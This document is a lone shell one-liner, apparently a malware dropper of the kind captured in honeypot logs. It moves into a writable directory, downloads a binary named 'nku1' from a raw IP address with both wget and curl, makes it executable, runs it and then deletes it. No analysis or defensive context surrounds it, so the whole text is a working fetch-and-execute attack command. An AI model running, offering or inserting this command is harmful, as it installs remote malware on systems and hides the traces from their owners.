cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://89.39.107.56/nku1; curl -O http://89.39.107.56/nku1; chmod +x nku1; ./nku1; rm -rf nku1
